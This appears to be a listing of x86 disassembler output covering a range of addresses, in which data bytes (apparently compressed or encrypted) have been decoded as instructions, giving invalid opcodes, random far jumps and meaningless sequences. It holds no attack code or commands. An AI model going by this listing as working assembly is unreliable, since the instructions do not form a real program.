  42bd62:	dec    edx
  42bd63:	mov    ebx,DWORD PTR [ebx+0x34]
  42bd66:	xchg   ebp,eax
  42bd67:	pop    ebx
  42bd68:	xchg   dl,ch
  42bd6a:	stos   BYTE PTR es:[edi],al
  42bd6b:	out    dx,eax
  42bd6c:	sbb    DWORD PTR [edi],edi
	...
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bd8c
  42bde3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bde4:	mov    ds:0x1d66748,eax
  42bde9:	add    BYTE PTR [eax],al
  42bdeb:	add    DWORD PTR [eax],eax
  42bded:	add    BYTE PTR [eax-0x7e],cl
  42bdf0:	cdq    
  42bdf1:	popa   
  42bdf2:	sub    eax,0xa4ae0794
  42bdf7:	xchg   esp,eax
  42bdf8:	rcr    BYTE PTR [ebx-0x3f],cl
  42bdfb:	sub    al,0x4c
  42bdfd:	xchg   ebp,eax
  42bdfe:	cld    
  42bdff:	or     al,0x9e
  42be01:	push   ds
  42be02:	fst    QWORD PTR [eax]
  42be04:	pop    es
  42be05:	mov    ebp,0xb117d97f
  42be0a:	popa   
  42be0b:	push   edi
  42be0c:	cmp    eax,ecx
  42be0e:	sbb    eax,0xb84383b8
  42be13:	cmp    al,0x6d
  42be15:	inc    edi
  42be16:	mov    ebp,0x48f7b04c
  42be1c:	mov    eax,0x9b53976
  42be21:	clc    
  42be22:	icebp  
  42be23:	mov    al,0xfe
  42be25:	xor    BYTE PTR [edi+0x2c],dl
  42be28:	sbb    ebp,DWORD PTR [ecx-0x12a429e0]
  42be2e:	dec    ebx
  42be2f:	adc    esi,DWORD PTR [ebx+0x7e074644]
  42be35:	mov    eax,0x76eb0e7f
  42be3a:	inc    edx
  42be3b:	in     eax,dx
  42be3c:	xchg   edx,eax
  42be3d:	xchg   esi,eax
  42be3e:	retf   0x3eff
  42be41:	cmp    BYTE PTR [ecx+0x24fed07],ah
  42be47:	dec    ebx
  42be48:	test   DWORD PTR [ebx+0x2a6087d2],ebx
  42be4e:	lods   al,BYTE PTR ds:[esi]
  42be4f:	push   edi
  42be50:	pop    ebp
  42be51:	xchg   edi,eax
  42be52:	xor    BYTE PTR [ecx+ebp*1-0x6b],ah
  42be56:	mov    eax,0xc432f018
  42be5b:	fwait
  42be5c:	aad    0xb7
  42be5e:	(bad)  
  42be5f:	test   esp,eax
  42be61:	xor    BYTE PTR [ebx+0x20],bl
  42be64:	arpl   WORD PTR [ebp+ebp*4-0x105c39b6],si
  42be6b:	mov    cl,0xfa
  42be6d:	je     0x42be9b
  42be6f:	push   cs
  42be70:	data16 into 
  42be72:	and    BYTE PTR [edi],cl
  42be74:	jae    0x42be40
  42be76:	pop    edi
  42be77:	ja     0x42be81
  42be79:	push   eax
  42be7a:	mov    WORD PTR [esi+ecx*4+0x1d224920],?
  42be81:	mov    BYTE PTR [edx],0x76
  42be84:	cmp    ebx,edi
  42be86:	xchg   BYTE PTR [eax],ah
  42be88:	jae    0x42be53
  42be8a:	sahf   
  42be8b:	bound  ecx,QWORD PTR [esi]
  42be8d:	scas   al,BYTE PTR es:[edi]
  42be8e:	jb     0x42bec4
  42be90:	mov    bh,0x37
  42be92:	retf   
  42be93:	jle    0x42be3b
  42be95:	sub    ah,0x77
  42be98:	int3   
  42be99:	mov    bl,0x51
  42be9b:	dec    eax
  42be9c:	and    dh,dl
  42be9e:	(bad)  
  42be9f:	jl     0x42be60
  42bea1:	push   cs
  42bea2:	dec    edx
  42bea3:	push   esp
  42bea4:	fwait
  42bea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bea6:	or     ebx,DWORD PTR [ecx-0x2bff2b60]
  42beac:	mov    eax,0xf12c3215
  42beb1:	lock push ecx
  42beb3:	inc    ecx
  42beb4:	outs   dx,BYTE PTR ds:[esi]
  42beb5:	dec    edx
  42beb6:	inc    esp
  42beb7:	mov    dh,dl
  42beb9:	adc    cl,BYTE PTR [ecx+0xf8ded87]
  42bebf:	push   ebp
  42bec0:	scas   al,BYTE PTR es:[edi]
  42bec1:	mov    esp,0x4f4957bb
  42bec6:	sub    bh,BYTE PTR [edx-0x14a548ab]
  42becc:	inc    esi
  42becd:	add    eax,0xb8a6d7c6
  42bed2:	cmp    dl,BYTE PTR [ecx-0x21691466]
  42bed8:	sar    DWORD PTR [eax-0x2a5ca6ed],cl
  42bede:	mov    esp,0xf86761c
  42bee3:	out    dx,al
  42bee4:	leave  
  42bee5:	xor    al,0x34
  42bee7:	int3   
  42bee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bee9:	(bad)  
  42beea:	jp     0x42bf2c
  42beec:	push   ebp
  42beed:	test   eax,0x0
	...
  42bf56:	xchg   edi,eax
  42bf57:	and    BYTE PTR [edi-0x26],al
  42bf5a:	idiv   edi
  42bf5c:	lahf   
  42bf5d:	ins    DWORD PTR es:[edi],dx
  42bf5e:	mov    ds:0x3d7bd7c8,eax
  42bf63:	or     ebx,DWORD PTR [edx]
  42bf65:	hlt    
  42bf66:	xlat   BYTE PTR ds:[bx]
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	imul   edx,DWORD PTR [ebx+ecx*1],0x5a
  42bf72:	dec    esp
  42bf73:	or     BYTE PTR [ebx-0x58],0x8
  42bf77:	dec    esp
  42bf78:	call   0x74b7:0xe8bc003c
  42bf7f:	stos   DWORD PTR es:[edi],eax
  42bf80:	retf   
  42bf81:	aaa    
  42bf82:	out    dx,al
  42bf83:	dec    esp
  42bf84:	lahf   
  42bf85:	imul   DWORD PTR [ebp+0x3d]
  42bf88:	mov    ah,0x44
  42bf8a:	scas   eax,DWORD PTR es:[edi]
  42bf8b:	add    eax,0x255d06cf
  42bf90:	fld    DWORD PTR [edx-0x25]
  42bf93:	pop    ss
  42bf94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf95:	in     eax,dx
  42bf96:	outs   dx,BYTE PTR ds:[esi]
  42bf97:	mov    ecx,0x1d74de92
  42bf9c:	clc    
  42bf9d:	mov    edi,0x6ccdcc53
  42bfa2:	frstor [ebx+0x5a]
  42bfa5:	paddd  mm3,QWORD PTR [ecx-0x36a548e8]
  42bfac:	out    dx,al
  42bfad:	stc    
  42bfae:	sbb    DWORD PTR [esi+0x68a59eaa],eax
  42bfb4:	xor    bl,BYTE PTR [ebx]
  42bfb6:	sbb    DWORD PTR [edi+0x618c6c24],eax
  42bfbc:	mov    ch,ah
  42bfbe:	call   0xf885:0xedda50f3
  42bfc5:	rcl    esi,0x61
  42bfc8:	scas   eax,DWORD PTR es:[edi]
  42bfc9:	mov    ebp,0xf14f662e
  42bfce:	in     eax,0x5
  42bfd0:	adc    bl,BYTE PTR [ebx]
  42bfd2:	mov    ds:0x6092eab7,al
  42bfd7:	mov    ch,0x6a
  42bfd9:	ss mov ch,0x4b
  42bfdc:	adc    edi,DWORD PTR [edi+0x64]
  42bfdf:	dec    eax
  42bfe0:	bound  ebp,QWORD PTR ds:0xdaf4dc3e
  42bfe6:	aad    0x7c
  42bfe8:	mov    ch,0xd8
  42bfea:	outs   dx,DWORD PTR ds:[esi]
  42bfeb:	xor    cl,BYTE PTR [ebp+0x66]
  42bfee:	add    ebp,esi
  42bff0:	pop    ds
  42bff1:	jl     0x42c03e
  42bff3:	jb     0x42c02c
  42bff5:	push   esi
  42bff6:	jl     0x42bfac
  42bff8:	xchg   esi,eax
  42bff9:	pop    ds
  42bffa:	dec    ecx
  42bffb:	(bad)  
  42bffc:	popf   
  42bffd:	fs mov edx,0x417e8836
  42c003:	push   ss
  42c004:	inc    ebx
  42c005:	lods   eax,DWORD PTR ds:[esi]
  42c006:	sbb    BYTE PTR [edi+0xa4159e6],al
  42c00c:	mov    cl,0x33
  42c00e:	pop    esi
  42c00f:	fs lods al,BYTE PTR cs:[esi]
  42c012:	mov    ch,0xd
  42c014:	pushf  
  42c015:	test   DWORD PTR [ebx],0x10561909
  42c01b:	sti    
  42c01c:	adc    eax,0xa74d6d72
  42c021:	leave  
  42c022:	dec    esi
  42c023:	pop    es
  42c024:	bound  esi,QWORD PTR [ecx-0x35]
  42c027:	ret    
  42c028:	xor    al,0xb8
  42c02a:	stos   BYTE PTR es:[edi],al
  42c02b:	push   eax
  42c02c:	and    ebx,DWORD PTR [ebx]
  42c02e:	pop    esp
  42c02f:	in     al,0xce
  42c031:	adc    eax,0x76cc4a36
  42c036:	cmp    ebx,DWORD PTR [esi+0x653494fa]
  42c03c:	mov    esp,0x14862665
  42c041:	ins    BYTE PTR es:[edi],dx
  42c042:	mov    ecx,0x5b707d5
  42c047:	add    ebp,esp
  42c049:	cmp    edi,DWORD PTR [ecx+0x4c]
  42c04c:	gs pop es
  42c04e:	imul   esp,DWORD PTR [esi-0x1d],0x42
  42c052:	pop    esp
  42c053:	call   0xb087:0x646997cd
  42c05a:	imul   edx,DWORD PTR [edx+0x3b1354c6],0x75
  42c061:	clc    
  42c062:	(bad)  
  42c063:	rcl    al,1
  42c065:	lods   eax,DWORD PTR ds:[esi]
  42c066:	lahf   
  42c067:	jno    0x42c0af
  42c069:	jnp    0x42c003
  42c06b:	out    0x83,al
  42c06d:	lock add BYTE PTR [eax],al
	...
  42c0d4:	add    BYTE PTR [eax],al
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	mov    bh,0xb6
  42c0e4:	mov    edx,0x1d86764
  42c0e9:	add    BYTE PTR [eax],al
  42c0eb:	add    DWORD PTR [eax],eax
  42c0ed:	add    BYTE PTR [eax+eiz*1+0x75ea2179],al
  42c0f4:	sbb    ch,0x74
  42c0f7:	adc    eax,0xcf1be553
  42c0fc:	imul   ecx,DWORD PTR [edi+0x785445d9],0x48
  42c103:	jge    0x42c15e
  42c105:	or     edi,DWORD PTR [ecx+0x66fa0d2]
  42c10b:	shr    bl,0xb7
  42c10e:	inc    esi
  42c10f:	xor    eax,0x116f8238
  42c114:	mov    esp,0xedc00782
  42c119:	aaa    
  42c11a:	lahf   
  42c11b:	or     al,ch
  42c11d:	aam    0x35
  42c11f:	jg     0x42c18b
  42c121:	ja     0x42c0da
  42c123:	xchg   ebx,eax
  42c124:	mov    al,0x28
  42c126:	sbb    DWORD PTR [ecx-0x46],ebp
  42c129:	push   es
  42c12a:	nop
  42c12b:	dec    edi
  42c12c:	cmp    BYTE PTR [ebx+0x7d468020],dl
  42c132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c133:	add    al,0x2
  42c135:	dec    edi
  42c136:	push   es
  42c137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c138:	dec    esp
  42c139:	neg    DWORD PTR [edi+edi*1]
  42c13c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c13d:	dec    esi
  42c13e:	ja     0x42c13f
  42c140:	adc    BYTE PTR [edx+eax*8],0xb2
  42c144:	inc    ebp
  42c145:	nop
  42c146:	inc    ebp
  42c147:	sbb    al,0x26
  42c149:	fsubr  st,st(1)
  42c14b:	shl    DWORD PTR [ecx-0xf],1
  42c14e:	pop    esp
  42c14f:	ins    BYTE PTR es:[edi],dx
  42c150:	ja     0x42c16c
  42c152:	dec    edx
  42c153:	and    edx,DWORD PTR [edi]
  42c155:	aaa    
  42c156:	lock jge 0x42c1b3
  42c159:	nop
  42c15a:	rcl    BYTE PTR [esi-0x5a15f45c],cl
  42c160:	cmp    esi,0x8
  42c163:	dec    edi
  42c164:	inc    edi
  42c165:	jl     0x42c1df
  42c167:	jae    0x42c1aa
  42c169:	and    eax,0xd3c2e04
  42c16e:	outs   dx,DWORD PTR ds:[esi]
  42c16f:	and    bl,BYTE PTR [esi+0x3b31024]
  42c175:	mov    cl,BYTE PTR [ecx-0x1eaf00b0]
  42c17b:	fsubr  DWORD PTR fs:[ebx]
  42c17e:	xlat   BYTE PTR ds:[ebx]
  42c17f:	mov    ds:0x91816e1,eax
  42c184:	setl   cl
  42c187:	mov    dl,0x87
  42c189:	dec    esp
  42c18a:	xchg   ecx,eax
  42c18b:	mov    bh,0x11
  42c18d:	adc    DWORD PTR [edi],esi
  42c18f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c190:	sbb    ebp,eax
  42c192:	xchg   edx,eax
  42c193:	out    0x5d,al
  42c195:	mov    es,WORD PTR [edi-0x4a]
  42c198:	jmp    0x52c0:0xaaf81b7e
  42c19f:	dec    ecx
  42c1a0:	test   esp,0x742c6990
  42c1a6:	or     ecx,DWORD PTR [esp+edx*1-0x46]
  42c1aa:	fwait
  42c1ab:	cs sbb al,0x11
  42c1ae:	push   0xffffffe9
  42c1b0:	xchg   ebp,eax
  42c1b1:	imul   ebp,esp,0x24
  42c1b4:	xor    BYTE PTR [eax-0x3a],dl
  42c1b7:	imul   ecx,DWORD PTR [ecx-0x8],0xffffff85
  42c1bb:	(bad)  
  42c1bc:	in     al,0xa9
  42c1be:	jl     0x42c1f8
  42c1c0:	repz imul esp,DWORD PTR [eax-0x1d779108],0xdf8516e
  42c1cb:	call   0x162231cb
  42c1d0:	daa    
  42c1d1:	shl    DWORD PTR [edx-0x3f],cl
  42c1d4:	fstp   QWORD PTR [eax-0x778d3f02]
  42c1da:	add    esp,DWORD PTR [edx]
  42c1dc:	cmp    DWORD PTR [eax+0x75],esp
  42c1df:	push   edx
  42c1e0:	int3   
  42c1e1:	cs sti 
  42c1e3:	mov    al,ds:0xad563291
  42c1e8:	test   DWORD PTR [edx-0x11ce7ab1],0x0
	...
  42c256:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	cli    
  42c263:	test   al,0xc4
  42c265:	xchg   edi,eax
  42c266:	fld    DWORD PTR [bx+di]
  42c269:	add    BYTE PTR [eax],al
  42c26b:	add    DWORD PTR [eax],eax
  42c26d:	add    al,dh
  42c26f:	mov    al,ds:0x75ea5db0
  42c274:	xor    BYTE PTR [esi-0x163a77f9],al
  42c27a:	cmp    edi,DWORD PTR [eax+0x7753ecee]
  42c280:	mov    esp,0xa22a6b0a
  42c285:	pop    edx
  42c286:	ins    DWORD PTR es:[edi],dx
  42c287:	(bad)  
  42c288:	shl    DWORD PTR [esi],1
  42c28a:	js     0x42c222
  42c28c:	data16 outs dx,BYTE PTR ds:[esi]
  42c28e:	scas   eax,DWORD PTR es:[edi]
  42c28f:	and    DWORD PTR [eax],ecx
  42c291:	cmp    al,0xf0
  42c293:	push   edx
  42c294:	xchg   esi,eax
  42c295:	sbb    al,0xde
  42c297:	cmp    DWORD PTR [esi+0x73613ae4],0x5e
  42c29e:	xor    BYTE PTR [ecx+0x6e36241a],bh
  42c2a4:	stos   DWORD PTR es:[edi],eax
  42c2a5:	repz xchg bl,bl
  42c2a8:	pop    ecx
  42c2a9:	mov    edx,0xf1a6fef8
  42c2ae:	jb     0x42c284
  42c2b0:	dec    eax
  42c2b1:	stos   DWORD PTR es:[edi],eax
  42c2b2:	xchg   DWORD PTR [edx-0x5c],ecx
  42c2b5:	scas   eax,DWORD PTR es:[edi]
  42c2b6:	enter  0xbc55,0x51
  42c2ba:	arpl   di,cx
  42c2bc:	lods   al,BYTE PTR ds:[esi]
  42c2bd:	out    0xba,al
  42c2bf:	jg     0x42c2f0
  42c2c1:	lods   al,BYTE PTR ds:[esi]
  42c2c2:	mov    ebp,ebx
  42c2c4:	dec    ebp
  42c2c5:	jb     0x42c2ec
  42c2c7:	xchg   esp,eax
  42c2c8:	out    0xbf,eax
  42c2ca:	xchg   ebx,eax
  42c2cb:	xchg   esp,eax
  42c2cc:	jae    0x42c27c
  42c2ce:	push   ebp
  42c2cf:	push   ss
  42c2d0:	mov    ecx,0xb37e42a8
  42c2d5:	fwait
  42c2d6:	mov    eax,DWORD PTR [ebx+0x6c832771]
  42c2dc:	sub    BYTE PTR [esi+0x1895aaae],al
  42c2e2:	mov    edx,0x32444e58
  42c2e7:	rcr    BYTE PTR [esi+0x2dc8ef23],1
  42c2ed:	or     al,0x8a
  42c2ef:	dec    ebp
  42c2f0:	imul   edx,DWORD PTR [ebx],0xffffff81
  42c2f3:	dec    esp
  42c2f4:	dec    edx
  42c2f5:	in     al,dx
  42c2f6:	jle    0x42c28d
  42c2f8:	push   esp
  42c2f9:	xchg   BYTE PTR [ecx-0x63],cl
  42c2fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2fd:	leave  
  42c2fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c2ff:	push   ecx
  42c300:	or     DWORD PTR [edx+0x693921a1],esp
  42c306:	inc    edx
  42c307:	lods   al,BYTE PTR ds:[esi]
  42c308:	ret    
  42c309:	fdiv   st,st(0)
  42c30b:	js     0x42c349
  42c30d:	cdq    
  42c30e:	mov    dl,0x46
  42c310:	xor    DWORD PTR [ebx+esi*4],0x3d
  42c314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c315:	mov    ds:0x71581fc6,eax
  42c31a:	shl    BYTE PTR [eax-0x29c6e933],0xf9
  42c321:	sub    eax,0x5fa556d4
  42c326:	imul   esi,edx,0xcddb098e
  42c32c:	icebp  
  42c32d:	(bad)  
  42c32e:	or     al,0xda
  42c330:	sar    DWORD PTR [ebx+edx*2-0x77e11bd5],0x7d
  42c338:	(bad)  
  42c339:	scas   al,BYTE PTR es:[edi]
  42c33a:	xchg   ebp,eax
  42c33b:	(bad)  [ecx-0x68]
  42c33e:	pop    edx
  42c33f:	adc    ebp,ebx
  42c341:	iret   
  42c342:	push   edi
  42c343:	mov    dh,0x54
  42c345:	test   DWORD PTR [ebx+eax*2-0x74b4c91e],edi
  42c34c:	add    DWORD PTR [eax+0x8],edi
  42c34f:	mov    dl,0x9d
  42c351:	mov    BYTE PTR [ebx],cl
  42c353:	jg     0x42c3d0
  42c355:	cdq    
  42c356:	and    ch,BYTE PTR [ecx+eiz*8+0x6042d521]
  42c35d:	mov    ch,0xbd
  42c35f:	std    
  42c360:	jns    0x42c387
  42c362:	iret   
  42c363:	dec    ebp
  42c365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c366:	cmp    al,0x73
  42c368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c369:	jecxz  0x42c384
  42c36b:	dec    ecx
  42c36c:	ds add BYTE PTR ss:[eax],al
	...
  42c3d4:	add    BYTE PTR [eax],al
  42c3d6:	out    0xf,al
  42c3d8:	fldcw  WORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x765122f6
  42c3e5:	xlat   BYTE PTR ds:[ebx]
  42c3e6:	fiadd  DWORD PTR [bx+di]
  42c3e9:	add    BYTE PTR [eax],al
  42c3eb:	add    DWORD PTR [eax],eax
  42c3ed:	add    BYTE PTR ds:0xece36c97,cl
  42c3f3:	sahf   
  42c3f4:	inc    edi
  42c3f5:	(bad)  
  42c3f6:	xchg   edx,eax
  42c3f7:	es retf 
  42c3f9:	leave  
  42c3fa:	sar    DWORD PTR [ebx-0x14039bcd],cl
  42c400:	ja     0x42c3f2
  42c402:	inc    DWORD PTR [edx-0x584e9115]
  42c408:	or     al,0xd4
  42c40a:	fadd   DWORD PTR [eax+0x2b]
  42c40d:	adc    DWORD PTR [esi],ecx
  42c40f:	inc    esi
  42c410:	mov    al,ds:0x49284e9
  42c415:	jbe    0x42c46d
  42c417:	or     al,0xa6
  42c419:	les    ecx,FWORD PTR [edx]
  42c41b:	lods   eax,DWORD PTR ds:[esi]
  42c41c:	out    0xb2,eax
  42c41e:	mul    DWORD PTR [ecx+0x5]
  42c421:	mov    esp,0xd2ad18f1
  42c426:	xor    DWORD PTR [esi-0x63f6bec4],ebx
  42c42c:	mov    edx,0xa7c530e1
  42c431:	fs add eax,0x33355402
  42c437:	outs   dx,DWORD PTR ds:[esi]
  42c438:	jmp    0x9bcac3d6
  42c43d:	push   ecx
  42c43e:	sbb    al,0xc5
  42c440:	xchg   ebx,eax
  42c441:	retf   0xc4cf
  42c444:	mov    ebp,0x91a2e80d
  42c449:	addr16 mov cl,0xbd
  42c44c:	cmp    DWORD PTR ds:0xf2e44def,edi
  42c452:	aam    0x8e
  42c454:	mov    ds:0x47866291,al
  42c459:	in     eax,dx
  42c45a:	push   ss
  42c45b:	imul   ecx,DWORD PTR [ebp+0x2e63237a],0x61
  42c462:	test   ecx,ebp
  42c464:	xor    DWORD PTR [eax],0x32f0e421
  42c46a:	mov    esp,DWORD PTR [edx]
  42c46c:	scas   eax,DWORD PTR es:[edi]
  42c46d:	sbb    eax,0x6916faac
  42c472:	int3   
  42c473:	jecxz  0x42c43a
  42c475:	xor    eax,0xa7d4efc
  42c47a:	dec    ecx
  42c47b:	mov    bl,0xd0
  42c47d:	add    edi,0x88d3c0d4
  42c483:	dec    edi
  42c484:	dec    edx
  42c485:	iret   
  42c486:	stos   DWORD PTR es:[edi],eax
  42c487:	clc    
  42c488:	cmp    DWORD PTR [ebx-0x570b0618],esi
  42c48e:	clc    
  42c48f:	stc    
  42c490:	push   ss
  42c491:	mov    al,0x8b
  42c493:	mov    esp,0x6b54d244
  42c498:	je     0x42c4dd
  42c49a:	outs   dx,DWORD PTR ds:[esi]
  42c49b:	lds    edx,FWORD PTR [eax+ebp*2]
  42c49e:	jl     0x42c498
  42c4a0:	out    0x55,eax
  42c4a2:	test   DWORD PTR [ecx],ebx
  42c4a4:	inc    ebp
  42c4a5:	ins    DWORD PTR es:[edi],dx
  42c4a6:	in     al,0xcd
  42c4a8:	setns  BYTE PTR [ebx]
  42c4ab:	pop    esi
  42c4ac:	lds    esp,FWORD PTR [edi-0x53]
  42c4af:	cmp    eax,0x252f0d06
  42c4b4:	dec    eax
  42c4b5:	xchg   ebp,eax
  42c4b6:	xchg   esi,eax
  42c4b7:	xchg   edx,eax
  42c4b8:	and    esp,DWORD PTR [ecx]
  42c4ba:	lock fst DWORD PTR [edi-0x6ccc8355]
  42c4c1:	dec    ecx
  42c4c2:	adc    ah,BYTE PTR [esi+0x55]
  42c4c5:	outs   dx,DWORD PTR ds:[esi]
  42c4c6:	fdivrp st(1),st
  42c4c8:	mov    dl,0x1f
  42c4ca:	jg     0x42c4f2
  42c4cc:	fsubr  DWORD PTR [edx+ebx*1]
  42c4cf:	inc    ebx
  42c4d0:	xor    al,0xcc
  42c4d2:	dec    ebp
  42c4d3:	ret    
  42c4d4:	aas    
  42c4d5:	adc    al,0x7c
  42c4d7:	push   esi
  42c4d8:	add    DWORD PTR [eax],edx
  42c4da:	(bad)  
  42c4db:	enter  0x2284,0xbd
  42c4df:	jmp    0xe59b:0xa849a81f
  42c4e6:	sbb    dl,cl
  42c4e8:	add    ah,BYTE PTR [ebp-0x4b]
  42c4eb:	lods   eax,DWORD PTR ds:[esi]
  42c4ec:	scas   al,BYTE PTR es:[edi]
  42c4ed:	sub    BYTE PTR [eax],al
	...
  42c553:	add    BYTE PTR [eax],al
  42c555:	add    ah,ch
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0x734,0x8e
  42c564:	xor    bh,BYTE PTR [edx+0x1db67]
  42c56a:	add    BYTE PTR [ecx],al
  42c56c:	add    BYTE PTR [eax],al
  42c56e:	bound  ecx,QWORD PTR [edi+eiz*8]
  42c571:	cmp    al,0x89
  42c573:	push   edx
  42c574:	dec    edi
  42c575:	and    DWORD PTR [esi],ebx
  42c577:	das    
  42c578:	xchg   ecx,eax
  42c579:	stos   BYTE PTR es:[edi],al
  42c57a:	sar    ebx,1
  42c57c:	lods   al,BYTE PTR ds:[esi]
  42c57d:	add    BYTE PTR [edi+0x3e],0xcc
  42c581:	imul   edi,DWORD PTR [esi-0x6510e1b9],0x9dede3c3
  42c58b:	retf   0xe137
  42c58e:	push   ebx
  42c58f:	or     al,0x67
  42c591:	(bad)  
  42c592:	imul   DWORD PTR [eax]
  42c594:	dec    eax
  42c595:	jne    0x42c580
  42c597:	mov    BYTE PTR [eax+0x32946658],ah
  42c59d:	sbb    eax,0xaf20233
  42c5a2:	cdq    
  42c5a3:	jmp    0xa8d9:0xb74958f7
  42c5aa:	adc    edi,edi
  42c5ac:	lods   al,BYTE PTR ds:[esi]
  42c5ad:	outs   dx,DWORD PTR ds:[esi]
  42c5ae:	(bad)  
  42c5af:	in     eax,0xda
  42c5b1:	out    0x97,eax
  42c5b3:	rcr    DWORD PTR [edi],1
  42c5b5:	psadbw mm0,QWORD PTR [edi-0xe]
  42c5b9:	sub    al,0x6b
  42c5bb:	mov    ch,0x45
  42c5bd:	push   ebp
  42c5be:	cmp    eax,DWORD PTR [ecx]
  42c5c0:	mov    edx,0x73def294
  42c5c5:	sbb    dl,0xfe
  42c5c8:	inc    edx
  42c5c9:	or     BYTE PTR [eax],cl
  42c5cb:	in     eax,0x72
  42c5cd:	pop    edx
  42c5ce:	cwde   
  42c5cf:	sbb    DWORD PTR [edi+edx*1-0x42d71cd4],ebx
  42c5d6:	cld    
  42c5d7:	or     edx,DWORD PTR [edx+0x1d]
  42c5da:	adc    al,0xdb
  42c5dd:	add    al,0x92
  42c5df:	mov    ebp,0x81413c12
  42c5e4:	jl     0x42c5a1
  42c5e6:	fld    DWORD PTR [ebp+0x45]
  42c5e9:	int    0xe3
  42c5eb:	call   0x4c616785
  42c5f0:	dec    edx
  42c5f1:	mov    esp,0x8443bcb1
  42c5f6:	pop    eax
  42c5f7:	cdq    
  42c5f8:	fxch   st(5)
  42c5fa:	xchg   ebp,eax
  42c5fb:	push   ds
  42c5fc:	xchg   DWORD PTR ds:0x6bc79185,ecx
  42c602:	inc    esi
  42c603:	inc    edi
  42c604:	iret   
  42c605:	arpl   WORD PTR [ecx],bx
  42c607:	fcmovbe st,st(4)
  42c609:	ja     0x42c672
  42c60b:	push   edi
  42c60c:	rol    BYTE PTR [ebx+0x23],cl
  42c60f:	dec    edi
  42c610:	outs   dx,BYTE PTR ds:[esi]
  42c611:	fs repz loop 0x42c606
  42c615:	aas    
  42c616:	or     al,0xa4
  42c618:	and    eax,0x17edb92f
  42c61d:	mov    al,0x15
  42c61f:	mov    ebx,edi
  42c621:	mov    dl,BYTE PTR [eax-0x3e51541e]
  42c627:	stc    
  42c628:	loopne 0x42c629
  42c62a:	loop   0x42c62a
  42c62c:	(bad)  
  42c62d:	sti    
  42c62e:	add    DWORD PTR [ebx+ebp*8+0x37],esp
  42c632:	jmp    esp
  42c634:	loope  0x42c5bb
  42c636:	rcr    DWORD PTR [ebp+0x5716c95f],0x51
  42c63d:	dec    eax
  42c63e:	das    
  42c63f:	mov    al,ds:0x7f214cb7
  42c644:	and    cl,BYTE PTR [ecx+0x734c69d8]
  42c64a:	add    ecx,DWORD PTR [edx]
  42c64c:	lea    esp,[ebx+0x72c61db5]
  42c652:	je     0x42c68d
  42c654:	jge    0x42c63f
  42c656:	push   0x4
  42c658:	mov    esp,0xf05e4ac2
  42c65d:	enter  0x7a7b,0x9b
  42c661:	push   eax
  42c662:	mov    dh,0xe7
  42c664:	fisubr DWORD PTR [edi]
  42c666:	aas    
  42c667:	xlat   BYTE PTR ds:[ebx]
  42c668:	fwait
  42c669:	pop    ebp
  42c66a:	fnstcw WORD PTR [ecx-0x7]
  42c66d:	sbb    DWORD PTR [eax],eax
	...
  42c6d3:	add    BYTE PTR [eax],al
  42c6d5:	add    BYTE PTR [ebp+0x48],bl
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx+0x7b6dfc6b]
  42c6e3:	ins    DWORD PTR es:[edi],dx
  42c6e4:	dec    esp
  42c6e5:	and    BYTE PTR [edi-0x24],0x1
  42c6e9:	add    BYTE PTR [eax],al
  42c6eb:	add    DWORD PTR [eax],eax
  42c6ed:	add    BYTE PTR [ecx],bl
  42c6ef:	push   ebx
  42c6f0:	dec    ecx
  42c6f1:	lea    ebp,[ebp-0x78]
  42c6f4:	mov    edx,0x2b5c243e
  42c6f9:	push   ecx
  42c6fa:	xchg   esp,eax
  42c6fb:	hlt    
  42c6fc:	mov    ds:0x481cd2ea,al
  42c701:	mov    WORD PTR [edi+0x43],gs
  42c704:	aaa    
  42c705:	dec    ebx
  42c706:	xor    ebx,DWORD PTR [esi+0x14]
  42c709:	jbe    0x42c6ab
  42c70b:	neg    BYTE PTR [ecx]
  42c70d:	xchg   esi,eax
  42c70e:	jb     0x42c74c
  42c710:	ret    0x2ff2
  42c713:	call   0x6cdf:0x4f8f61b6
  42c71a:	jmp    DWORD PTR [ebp+0x4a796fb7]
  42c720:	mov    ah,0x26
  42c722:	rol    BYTE PTR [ecx+0x1f],1
  42c725:	(bad)  
  42c726:	jo     0x42c75d
  42c728:	pop    ebx
  42c729:	cmp    BYTE PTR [eax-0x4d],ch
  42c72c:	xor    al,0x20
  42c72e:	rcr    DWORD PTR [ebp+0x29],1
  42c731:	pop    ss
  42c732:	ficomp WORD PTR [esi]
  42c734:	data16 mov dh,0xf4
  42c737:	scas   eax,DWORD PTR es:[edi]
  42c738:	jne    0x42c78d
  42c73a:	xor    BYTE PTR [esi+0x71],0xe4
  42c73e:	ss aas 
  42c740:	or     DWORD PTR [eax+0x5],ecx
  42c743:	das    
